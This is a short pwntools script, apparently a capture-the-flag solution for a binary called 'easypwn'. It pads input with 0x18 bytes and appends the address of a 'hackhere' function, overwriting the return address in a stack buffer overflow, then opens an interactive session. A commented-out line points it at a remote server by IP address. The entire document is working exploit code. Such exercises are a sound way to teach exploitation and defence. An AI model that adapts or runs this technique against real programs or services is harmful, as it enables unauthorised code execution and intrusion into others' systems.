from pwn import *
context.log_level = 'debug'
execve_file = './easypwn' 
r = process(execve_file) 
# r = remote('47.108.135.45', 20039) 
e = ELF(execve_file)

hackhere = e.symbols['hackhere']

payload = 0x18 * 'a' + p64(hackhere)
# r.recvline()
r.recvuntil(">")
r.sendline(payload)

r.interactive()
